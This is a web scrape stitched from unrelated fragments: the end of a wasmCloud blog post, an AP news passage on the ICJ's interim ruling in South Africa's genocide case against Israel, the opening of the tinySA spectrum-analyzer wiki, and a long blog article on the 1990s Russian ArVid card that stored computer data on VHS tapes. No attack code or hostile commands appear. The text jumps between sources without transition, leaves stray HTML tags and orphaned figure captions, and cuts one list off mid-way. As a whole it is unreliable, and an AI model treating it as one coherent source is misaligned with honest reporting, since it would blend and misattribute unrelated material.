<p>If you have any questions or concerns, please drop by our <a href="https://slack.wasmcloud.com/" target="_blank" rel="noopener noreferrer">Slack</a> and let's have a discussion. While the new interfaces look different from what a seasoned wasmCloud developer is used to, they enable us to truly benefit from and contribute to WebAssembly standards, and the best experience is just within arm's reach.</p></div></div>]]></description>

    <p>The president of the International Court of Justice, Joan E. Donoghue, says a Hamas attack on October 7, 2023, triggered a major response by Israel.</p>
    
</div>



<p>The ruling amounted to an overwhelming rebuke of Israel’s wartime conduct and added to mounting international pressure to halt the nearly 4-month-old offensive, which <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/israel-hamas-11-3-2023-gaza-camp-8a25acaf136b897492158d128bf5742d" target="_blank" rel="noopener">has killed</a></span> more than 26,000 Palestinians, <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/palestinians-gaza-israel-bombing-destruction-hamas-reconstruction-f299a28410b70ee05dd764df97d8d3a0" target="_blank" rel="noopener">decimated vast swaths of Gaza</a></span> and driven nearly 85% of its 2.3 million people from their homes.</p>
    
<p>Allowing the accusations to stand stung the government of Israel, which was founded as a Jewish state after the Nazi slaughter of 6 million Jews during World War II.</p><p>Israeli Prime Minister Benjamin Netanyahu said the fact that the court was willing to discuss the genocide charges was a “mark of shame that will not be erased for generations.” He also vowed to press ahead with the war.</p>
    

<p>The power of the ruling was magnified by its timing, coming on the eve of International Holocaust Remembrance Day.</p><p>“Those truly needing to stand trial are those that murdered and kidnapped children, women and the elderly,” former Israeli Defense Minister Benny Gantz said, referring to Hamas militants who <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/israel-palestinians-hamas-attack-military-war-a8f63b07641212f0de61861844e5e71e" target="_blank" rel="noopener">stormed through Israeli communities</a></span> on Oct. 7 in the attack that set off the war. The assault killed some 1,200 people and resulted in another 250 being kidnapped.</p><p>The court also called on Hamas to release the hostages who are still in captivity. Hamas urged the international community to make Israel carry out the court’s orders.</p><p>Many of the measures were approved by an overwhelming majority of the judges. Of the six orders, an Israeli judge voted in favor of two — an order for humanitarian aid and another for the prevention of inflammatory speech.</p><p>Israeli Judge Aharon Barak said he supported those orders in the hope that they would “help to decrease tensions and discourage damaging rhetoric” while easing the ”consequences of the armed conflict for the most vulnerable.”</p>
    

<p>Such provisional measures issued by the world court are legally binding, but it is not clear if Israel will comply with them.</p><p>“We will continue to do what is necessary to defend our country and defend our people,” said Netanyahu, who pushed back against the ruling in two languages. In a message aimed at his domestic audience, the tone was more defiant in Hebrew, and he stopped short of overtly criticizing the court in English.</p><p>The court ruled that Israel must do all it can to prevent genocide, including refraining from killing Palestinians or causing harm to them. It also ruled that Israel urgently needs to get basic aid to Gaza and that the country should punish any incitement to genocide, among other measures.</p><p>The panel told Israel to submit a report on measures taken within a month.</p><p>“That’s a time that the court could come back and say, ‘You have not met the orders. You have not complied. Now we find you are in the midst of committing genocide,’” said Mary Ellen O’Connell, a professor of law and international peace studies at Notre Dame University’s Kroc Institute.</p>
    

<p>Friday’s decision was an interim ruling. It could take years for the court to consider all aspects of <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/world-court-israel-genocide-gaza-south-africa-774ab3c3d57fd7bcc627602eaf47fd98?utm_source=copy&amp;utm_medium=share" target="_blank" rel="noopener">South Africa’s</a></span> genocide allegations.</p><p>In Israel, commentators said the decision not to order a cease-fire was received with some relief since it helped Israel avoid a collision with a top U.N. body.</p><p>Palestinians and their supporters said the court took an important step toward holding Israel accountable. The Foreign Ministry of the internationally backed Palestinian self-rule government in the West Bank said the ruling “should serve as a wake-up call for Israel and actors who enabled its entrenched impunity,” in an apparent reference to the United States, Israel’s chief ally.</p><p>The U.S. repeated its position that Israel must “take all possible steps” to minimize harm to civilians, increase humanitarian aid and curb “dehumanizing rhetoric.”</p><p>“We continue to believe that allegations of genocide are unfounded,” the State Department said in a statement.</p>
    

<p>The South African government said the ruling determined that “Israel’s actions in Gaza are plausibly genocidal.”</p><p>“There is no credible basis for Israel to continue to claim that its military actions are in full compliance with international law, including the Genocide Convention,” the government said in a statement.</p><p>Israel often boycotts international tribunals and U.N. investigations, saying they are unfair and biased.

<p><span>Welcome to the tinySA<sup>®</sup> wiki!</span>
</p>
<p><strong>Important info on the tinySA Ultra</strong>
</p>
<p>The tinySA wiki is slowly being updated with info regarding the tinySA Ultra. The names tinySA4 and tinySA Ultra refer to the same device.
</p>
<p><strong>The tinySA are a small spectrum analyzers and signal generators with some nice capabilities:</strong>
</p>
<ul><li><strong>tinySA Basic</strong>
<ul><li>Screen size 2.8 inch
</li><li>Spectrum Analyzer with two inputs, high quality MF/HF/VHF input for 0.1MHZ-350MHz, lesser quality UHF input for 240MHz-960MHz or
</li><li>Signal Generator with two output, sine wave output for 0.1MHz - 350MHz and square wave output for 240MHz-960MHz when not used as Spectrum Analyzer.
</li><li>Switchable resolution bandpass filters for both ranges between 2.6kHz and 640kHz
</li><li>Color display showing max 290 scan points providing gapless covering up to the full low or high frequency range.
</li></ul></li><li><strong>tinySA Ultra</strong>
<ul><li>Screen size 4 inch
</li><li>Spectrum Analyzer for 0.1-800MHz or, with Ultra mode enabled, level calibrated up to 6GHz. Can observe signals up to 12GHz
</li><li>Signal Generator with sine wave output between 0.1-800MHz or square wave up to 4.4GHz or rf test signal output up to 5.3GHz when not used as Spectrum Analyzer.
</li><li>Switchable resolution bandpass filters from 200Hz to 850kHz
</li><li>Built-in 20dB optional LNA
</li><li>Color display showing max 450 points providing gapless covering up to the full frequency range.
</li><li>MicroSD card slot for storing measurements, settings and screen captures. 
</li></ul></li><li>Input Step attenuator from 0dB to 31dB (can not be used in combination with LNA).
</li><li>A built-in calibration signal generator that is used for automatic self test and (low) input calibration.
</li><li>Connected to a PC via USB it becomes a PC controlled Spectrum Analyzer or Signal Generator
</li><li>Rechargeable battery allowing a minimum of 2 hours of portable use
</li><li>Max input level +10dBm. <a href="https://tinysa.org/wiki/pmwiki.php?n=Main.Transmitters">Do not destroy your tinySA</a>
</li><li>The generator function can not be used as a tracking generator as you can not use the spectrum analyzer and generator functions at the same time.
</li><li>Due to the low cost and very small form factor there are certain relevant <a href="https://tinysa.org/wiki/pmwiki.php?n=Main.Limitations">tinySA limitations</a> and <a href="https://tinysa.org/wiki/pmwiki.php?n=TinySA4.Limitations">tinySA Ultra limitations</a>

<p><strong>Introduction and other videos </strong>
</p>
<p>A short 7 minute video introducing the main features of the tinySA can be found <a href="https://www.youtube.com/watch?v=k_rNLdZBuxo" rel="nofollow">here</a>.<br>A short introduction video to the tinySA Ultra can be found <a href="https://www.youtube.com/watch?v=xFD34qUc2PA" rel="nofollow">here</a>.<br>Many more videos in my <a href="https://www.youtube.com/playlist?list=PL5ZELMM2xseNkwVBtyAG00uZevwWUdVIg" rel="nofollow"><strong>YouTube channel</strong></a><br>A user has created an very extensive introduction video to the tinySA Ultra which can be found <a href="https://www.hamcom.dk/TinySA/TinySA%20ULTRA_UK.mp4" rel="nofollow">here</a>
</p>
<p><strong>Manual</strong>
</p>
<p>For those that prefer to read a document instead of browsing a wiki, there are two options.<br>Kurt Poulson was so kind to write an extensive document explaining various aspects of the tinySA for a Danish Amatuer Radio magazine. The English version can be found <a href="https://www.hamcom.dk/TinySA/Description_of_TinySA_a_real_Spectrum_Analyzer_for_little_money.pdf" rel="nofollow">here</a>. Kurt describes the operation of the signal generator and spectrum analyzer functions and explains how to update the FW. The document contains many screen captures of example measurements. 
</p>
<p>A second option is a PDF version of the wiki, which allows for easier reading for some people, that can be found <a href="https://groups.io/g/tinysa/files/tinySA-user-manual-march2021.pdf" rel="nofollow">here</a>

<h2>Storing massive data, as cheap as possible</h2>



<p>The year is 1995 and you live in post-Soviet Russia. </p>



<p>It’s a hellish time: prices for basic consumer goods are <em>tripl</em>e what they were last year. Your employer just paid your salary in eggs instead of money. There are daily shootouts between rival gangs. 🎵<em>Your love life’s DOA…</em>🎵</p>



<p>It’s a wonderful time: Russia is awash in Western computers, TVs, VCRs, cassette players and dialup modems. Technology that was strictly off-limits in 1989 is suddenly within reach.</p>



<p>As one of the lucky Russians to have a computer at home, you are facing a challenge: your 500MB hard drive is overflowing with software, games, and documents. You must find an affordable way to get more digital storage.</p>





<p>You <em>could</em> store files on cheap and plentiful floppy disks. But each floppy only stores 1.44MB and is known to randomly lose data. Your second option is to buy another hard drive. But that costs about $200 USD – as much as a Russian’s entire monthly salary…</p>



<p>You head over to the local computer store in a gray mood. The store is cramped with bootlegged computer games, peripherals and hardware. Inside, you ask Yevgeni the proprietor whether there might be a cheap solution to your storage problem.</p>



<p>This is Yevgeni:</p>




<div>
<figure><a href="https://jacobfilipp.com/wp-content/uploads/2024/01/arvid-1031-in-package.jpg"><img loading="lazy" decoding="async" width="805" height="532" src="https://jacobfilipp.com/wp-content/uploads/2024/01/arvid-1031-in-package.jpg" alt="" srcset="https://jacobfilipp.com/wp-content/uploads/2024/01/arvid-1031-in-package.jpg 805w, https://jacobfilipp.com/wp-content/uploads/2024/01/arvid-1031-in-package-300x198.jpg 300w, https://jacobfilipp.com/wp-content/uploads/2024/01/arvid-1031-in-package-768x508.jpg 768w, https://jacobfilipp.com/wp-content/uploads/2024/01/arvid-1031-in-package-766x506.jpg 766w" sizes="(max-width: 805px) 100vw, 805px"></a></figure></div>


<p>Fortunately, Yevgeni <em>does</em> have a 3<sub><sup>rd</sup></sub> option for you! It’s a truly innovative Russian-made product called <strong>the “ArVid” card</strong>. It comes in a package like this: </p>



<p>It is an ISA expansion card for your computer and will allow you to use your home-VCR to store <strong>4 hard-drives’ worth of data</strong> on a single VHS tape. The same tape you use to watch movies at home.</p>



<p>You hand over 80 American Dollars. Yevgeni slides out a little warranty card from inside the ArVid package, writes in the date of purchase and signs it. You step out of that store into the crisp air of a 1995 Moscow day. A proud owner of an ArVid 1030.</p>



<h2>Getting started with this device</h2>



<p>You take the package home and take a closer look at what’s inside:</p>



<div><p>There’s the ArVid ISA Card itself. This card slots into your “386” PC motherboard. The plate sits flush with the back of your computer. It has a port for a cable and a glossy diode for receiving an infrared signal.</p><figure><img loading="lazy" decoding="async" width="400" height="300" src="https://jacobfilipp.com/wp-content/uploads/2024/01/Kontr_Arvid-1020_2-e1705878838312.jpg" alt=""></figure></div>



<div><figure><img loading="lazy" decoding="async" width="1024" height="576" src="https://jacobfilipp.com/wp-content/uploads/2024/01/5333649035_335cdaf2a7_o-1024x576.jpg" alt=""></figure><p>The package includes several <a href="https://en.wikipedia.org/wiki/Floppy_disk">3½” floppy disks</a> . Each one is loaded with 1.44MB of software, drivers and documentation. A printed documentation pamphlet with “АPВИД” on the front is also included.</p></div>



<div><p>Finally, there is a custom cable that connected your computer to your VCR. Aside from the standard “video in” and “video out” connectors, this cable has an extra wire with an Infrared emitting LED at the tip (circled in red).</p><figure><img loading="lazy" decoding="async" width="400" height="300" src="https://jacobfilipp.com/wp-content/uploads/2024/01/Arvid-cable-with-IR-emitter.jpg" alt="" srcset="https://jacobfilipp.com/wp-content/uploads/2024/01/Arvid-cable-with-IR-emitter.jpg 400w, https://jacobfilipp.com/wp-content/uploads/2024/01/Arvid-cable-with-IR-emitter-300x225.jpg 300w" sizes="(max-width: 400px) 100vw, 400px"></figure></div>



<p>Here is how the card, VCR and home computer worked together:</p>



<div>
<p><img decoding="async" src="https://jacobfilipp.com/wp-content/uploads/2023/11/arvid-diagram-for-web-2.svg">
</p>



<div>
<ol>
<li>Your CRT screen showed the program’s interface.</li>



<li>During setup, you’d use the VCR’s remote to send commands like “play” to the ArVid card.</li>



<li>The ArVid card is inserted into the computer. It has an infrared diode to record those signals for your remote. It also has a connector for a special cable that carried Video IN, Video OUT and Infrared Out signals.</li>



<li>The Video IN and Video OUT RCA jacks went into designated jacks on the VCR device.</li>



<li>The cable has a thin wire with an infrared transmitter diode. You’d usually place it close to the front of the VCR (or tape it to the front, as shown). This diode beams out the pre-recorded signals that impersonate the remote control.</li>



<li>A domestic VHS tape would store your data. A 3-hour tape could store 2GB.</li>
</ol>
</div>
</div>



<h2>Impersonating your VCR remote</h2>



<p>After installing the ArVid card into your<a href="https://ancientelectronics.wordpress.com/2014/04/23/anatomy-of-a-386-dos-pc/"> 386 PC</a> and connecting all the video wires, the next challenge was getting the card to control your domestic VCR. </p>



<p>The ArVid had a neat way of controlling VCRs: it did so by pretending to be the VCR’s own remote-control. To accomplish this trick, users needed to “teach” the card which specific infrared remote-control signals corresponded to commands such as “play”, “stop” and “rewind”.</p>



<p>To “teach” the card, you needed to turn the back of your computer to face you. At the back of the card there was a shiny receiver diode. You’d point the VCR remote at it and the ArVid’s software would tell you which button to press while it recorded the signals. It could use modulated and unmodulated signals to disguise itself as your remote.</p>



<p>Teaching ArVid all of your VCR remote’s commands took 3 hours (… or <a href="https://web.archive.org/web/20070211143412/http://www.phantom.sannata.ru/cgi-bin/ikonboard/topic.cgi?forum=10&amp;topic=18">7 minutes, depending on who you believe</a> <sup>🇷🇺</sup>).</p>



<h2>Writing data to tape</h2>



<p>To prepare the tape for writing, ArVid tried to figure out the best “<a href="https://electronics.howstuffworks.com/vcr2.htm">tracking alignment</a>” for your VCR. It did so by writing a 2.5-minute data segment to tape, then reading it back while adjusting the VCR’s “read head” position to one of 6 different settings. ArVid calculated the reading “error rate” at each one of the 6 track positions. Finally, the software recommended the track alignment with the least number of errors for your VCR’s magnetic read-head.</p>



<p>Below: ArVid has tested 5 track-alignment options. It recommends option 3 – although it had more “double” errors than option 2 (164 of them) it had the fewest <em>total errors</em> at 7,887.</p>

<p>To write digital data from your computer to tape, you select the files using a custom file navigation program that resembled the popular “Norton Commander” application. Then pop one of these bad boys into your VCR:</p>





<p>Once you give the command to “write”, the ArVid card converts your file’s data into a video signal. At the same time, ArVid flashes the infrared emitter to send a “start recording” command to the VCR – and your data starts being laid down on the VHS magnetic tape.</p>



<p>When the computer is finished recording the files to tape, there is a “verification” step. ArVid rewinds the tape and reads back all the data it wrote to make sure there were no critical data losses.</p>

There were 23,795 “single” errors and 149 “double” errors. No “triple” errors.</figcaption></figure></div>


<h2>Reading data from tape</h2>



<p>To get your data of the VHS tape and into your computer, you needed 2 things: the tape and a special “table of contents” file. That file made it so you didn’t need to view the whole tape just to get a single file. ArVid left time markers on the tape that you could use to fast-forward to a specific file.</p>



<p>You’d insert the VHS tape into your VCR and bring up the ArVid software in reading mode. Pick the files you want to download from the tape and go! The device would send “fast forward”, “rewind” and “play” commands to your VCR and the video signal from the tape would go out of the VCR and into the computer. The computer converts the visual signal back into digital data.</p>



<h3>Boosting the quality of your backups</h3>



<p>The ArVid device and its software were remarkably reliable. But there were still things you could do if you wanted your data to stay safely stored on VHS tapes for a loooong time. The main factors within your control were the kind of VCR Device you owned and the quality of the VHS tapes you bought.</p>



<p>For the VCR, ArVid’s manufacturer recommended the pricy <em>Sony 130XR</em> and the cheaper <em>Akai-120EDG</em>. It appears that the best VCRs are heavy ones with a metal envelope. That’s because they don’t shake around as much when the tape is forwarded, rewound and stopped. You wouldn’t want a superfast-rewinding VCR either: the slow ArVid hardware would have trouble keeping up with it… (<a href="https://ru.wikipedia.org/wiki/%D0%9E%D0%B1%D1%81%D1%83%D0%B6%D0%B4%D0%B5%D0%BD%D0%B8%D0%B5%3A%D0%90%D1%80%D0%92%D0%B8%D0%B4">see these comments on Russian Wikipedia</a><sup>🇷🇺</sup>). ArVid would not work with 60Hz NTSC VCRs.</p>



<p>For the VHS tapes, the best ones were tapes with a 180-minute capacity. These tapes have the thickest magnetic ribbon inside. Longer-playing tapes had thinner tape, which were mechanically weaker and would wear down from use. This “tape thickness” logic makes sense when you think about the fact that longer tapes have to be thinner to fit in a standard VHS case.</p>



<p><em>Here is a video of ArVid’s set up, writing and reading (in Russian):</em></p>

<h2>The technical details</h2>



<p>To store signal on tape reliably, the device used only the luminance portion of the video signal. And only black and white – no grays. That means that variations in colour and sound were <strong>not used</strong> when recording data.</p>



<p>As best as I could figure out, data was stored to tape using <a href="https://en.wikipedia.org/wiki/Non-return-to-zero">Non-Return-to-Zero</a> encoding (<a href="https://groups.google.com/g/fido7.su.hardw.support.arvid/c/kEVSfplyuzk/m/ZWLxp3qYfhsJ">according to some Fido7 comments</a><sup>🇷🇺</sup>). On the tape itself, files were recorded in sections separated by 5-second blank intervals.</p>



<figure><a href="https://jacobfilipp.com/wp-content/uploads/2024/01/screenshot-arvid-faq-spacing-on-tape.png"><img loading="lazy" decoding="async" width="604" height="249" src="https://jacobfilipp.com/wp-content/uploads/2024/01/screenshot-arvid-faq-spacing-on-tape.png" alt="" srcset="https://jacobfilipp.com/wp-content/uploads/2024/01/screenshot-arvid-faq-spacing-on-tape.png 604w, https://jacobfilipp.com/wp-content/uploads/2024/01/screenshot-arvid-faq-spacing-on-tape-300x124.png 300w" sizes="(max-width: 604px) 100vw, 604px"></a><figcaption>An ASCII diagram from the ArVid FAQ, illustrating how files are laid out on tape.</figcaption></figure>



<p>Home-use VHS tapes had worse quality than commercial-grade magnetic tape, so the makers took extra measures to detect and fix errors on tape. ArVid read and wrote data using an error correction algorithm called “Reed-Solomon with Interleaving” (I also came across mentions of a Galois algorithm). They claimed that this let the ArVid software correct up to 3 defective bytes in a code group, and a loss of up to 450 consecutive bytes could be corrected. After reading data from tape, the software performed a <a href="https://www.lammertbies.nl/comm/info/crc-calculation">CRC32 check </a>for errors, operating on every 512-byte block.</p>


<div>
<figure><a href="https://jacobfilipp.com/wp-content/uploads/2024/01/real-time-ad.jpg"><img loading="lazy" decoding="async" width="722" height="973" src="https://jacobfilipp.com/wp-content/uploads/2024/01/real-time-ad.jpg" alt="" srcset="https://jacobfilipp.com/wp-content/uploads/2024/01/real-time-ad.jpg 722w, https://jacobfilipp.com/wp-content/uploads/2024/01/real-time-ad-223x300.jpg 223w" sizes="(max-width: 722px) 100vw, 722px"></a><figcaption>An ad for a computer store in gaming magazine Video-ACC. Mid 90s.</figcaption></figure></div>


<p>The ArVid software gave users a lot of information about the number of errors on tape. This was unique at a time when backup vendors preferred to pretend that errors didn’t exist. And it was a source of pride for the creators. This decision gave users the feedback they needed to improve their use of the system: you could see the impact of adjusting VCR tracking, purchasing better VHS tapes, switching out your VCR for another… even placing your VCR on a sturdier surface to reduce shaking and errors.</p>



<p>Errors could also be caused by VHS players taking a long time to “rev up to full speed” once playback started, so the ArVid software could be set to write more “initial empty frames” to make up for it.</p>



<p>Finally, the software saves a manifest of the files on your tape locally in “.TDR” format. This local table-of-contents gave the device a fast way of seeing and accessing the right file locations without playing through the whole tape. If the .TDR file was lost, there was also a program to recreated it by reading through an entire tape (a slow affair).</p>



<p>This is what the ArVid data on VHS tapes looked like if you played it through a normal TV:</p>

<h2>ArVid in action</h2>



<h3>Capacity and cost – how did it compare to other options? </h3>


<p>You could record an <strong>absolutely whopping</strong> amount of data onto a single VHS tape. All models of ArVid could record 1.08 Gigabytes onto a 180-minute tape, at a 100 kilobytes/sec speed. From model 1020 and onward, they could record 2.16 Gigabytes on that same tape (at 200 kilobytes/sec).</p>
<p>The ArVid system cost about $80 USD, with VHS tapes costing $4 USD, and a VCR that cost on average $160 (which many people already had at home). That was a phenomenal value for storage!</p>
<p>To show you just how good this was for the time, here are typical storage prices in 1997:</p>
<ul>
<li>CD-R recording drive – would start at $300 for the drive. CD capacity ranged from 184-870 Mb. Note that the first consumer CD-R under $1,000 was only introduced in September 1995 (<a href="https://en.wikipedia.org/wiki/CD-R">the Hewlett Packard model 4020i manufactured by Philips)</a></li>
<li>ZIP drive – cost $150 for the drive and $15 per disk (100mb each)</li>
<li>JAZ drive – $350 for the drive, and $85 for each disk (up to 1GB each)</li>
<li>3.5″ floppy drive – $28 CAD for the drive (source: <a href="https://archive.org/details/thecomputerpaper">1997 issue of the Computer Paper in Canada</a>) with the puny 1.44MB diskettes costing about $0.30 (as <a href="https://jacobfilipp.com/wp-content/uploads/2024/01/diskettes-ad-1997.jpg">seen in this ad</a> from the <a href="https://archive.org/details/issuu_dougalder_1996-01_tcp_on/page/n123/mode/2up">1996 issue of Computer Paper</a>). Although, you could get them as cheap as 14 cents if you’re willing to trust <a href="https://jacobfilipp.com/wp-content/uploads/2024/01/computer-clearance-and-apples.jpg">someone who runs a computers-and-apples warehouse!</a></li>
<li>Hard Drives – typical capacity would be around 1.2GB and would cost $150 USD.
<ul>
<li>Note that just 2 years before – in 1995 – hard drive capacity would’ve been only around 560 Mb (<a href="https://dosdays.co.uk/topics/1995.php">Source</a>). One VHS tape could store more information than an entire hard drive.</li>
</ul>

<h3>How long would data last on tape?</h3>



<p>The Canadian Conservation Institute says that <a href="https://www.canada.ca/en/conservation-institute/services/conservation-preservation-publications/technical-bulletins/digitization-vhs-video-tapes.html#a2b">VHS tapes have a 10-30 year lifespan, on average</a>.</p>



<p>In 2011, <a href="https://www.phantom.sannata.org/viewtopic.php?f=&amp;t=8665">user <em>Ctrl</em> on the <em>Sannata</em> forum<sup>🇷🇺</sup> used an ArVid system to successfully recover</a> all the files they saved onto a VHS tape in 1994/1995 without any errors. That’s 16 years of reliable data storage. <em>Ctrl </em>used the last-generation 1052 card for both writing and recovery. Another tape from 98 (on a semi-professional BASF tape) had only minor errors that didn’t affect data restoration.</p>



<p>On the same thread, user&nbsp;<em>Teodor</em> claimed they had no problems reading tapes from the late 90s in 2011. This person successfully used Hitachi VHS tapes. They had errors reading data at first, with a Panasonic NV-SD450 VCR, but saw a big improvement when they switched to the JVC HR-DD868 VCR.</p>



<p>On the Rutracker torrent site, <a href="https://rutracker.org/forum/viewtopic.php?p=47499118#47499118">user <em>korvegeta</em> successfully read from tapes in 2011</a><sup>🇷🇺</sup>. Although it isn’t known exactly when they were recorded. I’d guess 1998.</p>



<h3>Real-world use cases</h3>



<p>The ArVid devices were sold as data backup solutions. “PO KSI”, the manufacturers, directly positioned them as competitors for backup providers like <a href="https://en.wikipedia.org/wiki/Colorado_Memory_Systems">Colorado Memory Systems</a>, <a href="https://en.wikipedia.org/wiki/Quarter-inch_cartridge">QIC systems</a> and <a href="https://en.wikipedia.org/wiki/Tandberg_Data">Tandberg Data</a> . </p>



<p>The nature of the medium – VHS tape – means that they can’t be read and rewritten over and over again. That’s because heavy use causes mechanical wear on the magnetic VHS tape. “Write once – read infrequently” is the ideal use case.</p>



<p>Throughout my ArVid research, I saw that people indeed used this device for data backup. Among them were people who used these disks at the office. This makes sense because the average home user had a hard drive that was 500mb-1.2GB in size and there simply wasn’t enough “stuff” around to fill up several 2GB Tapes’ worth of data. Remember: this was in the infancy of the World Wide Web. No MP3s. No digital video. No software websites. Purchasing ArVid as a backup solution made more sense for a small business than for a home user.</p>



<p>Others mentioned storing Log Data on these tapes. There wasn’t much detail beyond that, except for an author that said he personally saw <a href="http://sannata.org/articles/arvid.shtml">academic experiment data being stored to tape using ArVid</a><sup>🇷🇺</sup>.</p>



<p>On both Russian and English forums, I found references to VHS tapes being used to shuttle Astronomical observation data between institutions. Presumably because of the cheap dollars-per-gigabyte for this medium.</p>

<p>People didn’t generally use these VHS tapes to exchange or sell data, like they did with floppy disks. There were several factors that made it challenging for one person to read data from a tape written by another person. These included differences in the ArVid hardware version, writing density, the quality of the VCR – even differences in the processing power between the two computers – all of them could create problems in reading a tape. This was despite the PO KSI team’s efforts to have backwards compatibility between ArVid versions. Another reason why tapes didn’t take off as a way to trade software: their capacity was overkill when most software at the time could fit on several floppies. I mean… as late as 1997 <a href="https://www.youtube.com/watch?v=p5o6NQmEA-8">Microsoft Office was available on floppy disks. Although 46 of them…</a></p>



<p>There were several interesting “off-label” uses for Arvid:</p>



<p>User <a href="https://www.yaplakal.com/forum3/st/25/topic2569781.html?hl=%D0%90%D1%80%D0%B2%D0%B8%D0%B4#entry120991245">Шеридан (“Sheridan”) on the Yaplakal forums<sup>🇷🇺</sup>, </a>recalled travelling to Moscow to purchase ArVid-made VHS tapes with many computer games packed on them. Sheridan then travelled back home, copied the individual games off the tape onto floppy disks and resold them to eager locals.</p>



<p>In the year 2000, vagrants kept stealing the lightbulb in the lobby of one enterprising ArVid use. He put on his vigilante cape and set up a security camera, an ArVid 1052 and a VCR as a kind of jerry-rigged motion-triggered camera. The system stayed on all day and video recording would only start once ArVid detected major visual changes using the <em>Arvid Control</em> software package (“<a href="https://web.archive.org/web/20041211201053/http://www.arvid.anadyr.ru/">Using ArVid as a surveillance system</a><sup>🇷🇺</sup>”). The culprits were caught on tape!</p>



<p>On Fidonet (a BBS network that also carried Usenet posts), ArVid  sparked the imaginations of Russia’s IT enthusiasts.&nbsp; One ambitious idea was to broadcast a video signal carrying data over a regular TV channel, in order to mass-share software to the homes of people who would tune in with their ArVid.</p>



<h2>Product improvements over time</h2>



<p>Production of ArVid cards went on from 1993 to the summer of 1998. In those 5 short years the product had a remarkable number of improvements.</p>



<p>The company that made them had the acronym “PO KSI” (short for “Professional Association of Designers of Data Processing Systems” in Russian). They were based in Zelenograd, a “one industry town” outside Moscow that was a hub for microelectronics production. The town was a brainchild of <a href="https://en.wikipedia.org/wiki/Alfred_Sarant">Alfred Sarant</a> and <a href="https://en.wikipedia.org/wiki/Joel_Barr">Joel Barr</a> – two spies who escaped from America and went on to illustrious careers in the USSR.</p>



<p>From a hardware perspective, the ISA cards <a href="https://www.youtube.com/watch?v=yZWUzcxMS7w">were an unusual mixture of Russian-made and foreign electronic components</a><sup>🇷🇺</sup>. The cards kept getting bigger built-in buffers and the ability to record data at a higher density (full history of specs in the Appendix). ArVid got a major boost when PO KSI moved from using an assembly of single-function microchips to using an <a href="https://www.alldatasheet.com/datasheet-pdf/pdf/525665/ACTEL/A1020B-PL84C.html">Actel a1020b-pl84c FPGA chip</a>. Switching to an FPGA processor meant that the cards ran cooler and didn’t cause the computer to overheat during operation.</p>



<p>Note the different look when you compare the older 1020 model with its integrated circuits to the newer 1052 with its big FPGA chip. <a href="https://www.phantom.sannata.org/viewtopic.php?t=2242&amp;start=33">(Photo source)</a><em>.</em></p>

<p>As we saw earlier, “training” the card to control your domestic VCR was critical to the system’s operation. Originally, ArVid would have had 2 infrared diodes built into the card’s back: a receiver to record signals from the remote control and a transmitter to send them ( <a href="https://www.youtube.com/watch?v=PB9FvHNIzco">according to YouTube comments by user “spbtvmaster”</a><sup>🇷🇺</sup>). But this setup meant that users had to rotate the back of their PC to face their VCR. PO KSI improved the experience by putting the infrared transmitter on a separate cable that could reach the VCR regardless of where the PC was facing.</p>



<p>Another improvement was to completely cut out the “training” phase for various VCR’s remotes. The company pre-recorded the remote-control sequences for common VCRs at the factory and shipped them with ArVid’s software package. Customers could pick their VCR make &amp; model from a list and be ready instantly. And if your VCR wasn’t on the preconfigured list, you could still train ArVid manually.</p>

This instantly loaded the correct remote-control signals to trigger “play”, “pause”, “fast forward” and other commands on the VCR. <a href="https://www.youtube.com/watch?v=dTWwNYnwUQA">Source video</a><sup>🇷🇺</sup>.</figcaption></figure></div>

<p>An extraordinary amount of documentation and software came with the ArVid device. You’d typically get:</p>
<ul>
<li>An up-to-date FAQ</li>
<li>User Interface walkthroughs for common operations</li>
<li>Descriptions of the .TDR format which was the “table of contents” for tapes</li>
<li>API descriptions</li>
<li>Data on compatibility with different PCs, VCRs and Tapes</li>
</ul>

<p>I thought it was a “Catch 22” that you had to buy the device in order to read which VCRs/PCs it was compatible with. How would I know if my system is compatible if I only get this information after purchasing ArVid?</p>
<p>But it turned out that most of the ArVid documents were freely available from BBS systems belonging to PO KSI and authorized dealers. Just set your modem to dial the dealer’s number between the hours of 8pm and 8am, and you could download all the FAQs before you bought the system.</p>
<p>These BBSs were part of the FidoNet7 network, a Russian <a href="https://en.wikipedia.org/wiki/FidoNet">network of BBSs that used software compatible with FidoNet</a> but independent of its political structure. <a href="https://www.fidonet.us/dummyguide.html">Here is more info about FidoNet</a>.</p>
<p>In 1997, a “newsgroup” was established at “<a href="https://groups.google.com/g/fido7.su.hardw.support.arvid">fido7.su.hardw.support.arvid</a>”<sup>🇷🇺</sup>. There, Mikel Lavrentyev – the main ArVid dealer – provided support to customers and prospects. There was also an official ArVid website at www.arvid.ru, <a href="https://web.archive.org/web/19990429075532/http://www.arvid.ru:8080/indexr.htm">now available through the Wayback Machine</a>. In this way, with a patchwork of Web and pre-Web technologies, customers could get close to real-time support. This was quite an accomplishment for a country that was undergoing rapid – <strong>and often violent </strong>– privatization after the Soviet Union collapsed.</p>


<p>To learn more about this time of transition, read “<a href="https://en.wikipedia.org/wiki/Privatization_in_Russia">Privatization in Russia</a>” on Wikipedia; “<a href="http://webhome.auburn.edu/~mitrege/FLRU2520/RussianOrganizedCrime.htm">The Russian Mob: Organized Crime in a Fledgling Democracy</a>“;&nbsp;and this Russian article about <a href="https://4pda.to/2018/04/06/350624/">how oligarchs and hustlers got their start in the computer industry</a><sup>🇷🇺</sup>.</p>

<p>While ArVid’s producers were a small company with a tiny dealer network, they did provide a warranty for the device. The pictured warranty, for a late-model ArVid 105 from 1997, covered 3 years. This was meaningful in a society where everything was uncertain and <a href="https://en.wikipedia.org/wiki/1998_Russian_financial_crisis#/media/File:Russian_inflation_rate_1993-2022.webp">inflation from 1993 to 1995 was always higher than 200% a year</a></p>



<h2>Software</h2>



<p>ArVid’s software could work under the DOS operating system, as well as Windows (3.1, 3.11, 95 and NT), and <a href="https://groups.google.com/g/relcom.comp.os.os2/c/0YaCfLtL7-Y/m/30jI9bTd0NQJ">OS/2</a><sup>🇷🇺</sup>. There were unofficial ports for <a href="https://groups.google.com/g/fido7.su.hardw.support.arvid/c/vOE7mg3DvqI/m/ejly3hHz80kJ">Linux</a><sup>🇷🇺</sup> and <a href="https://groups.google.com/g/fido7.su.hardw.support.arvid/c/esM2n46Jb_Y/m/ghsbNuFGsdcJ">FreeBSD</a><sup>🇷🇺</sup>.</p>



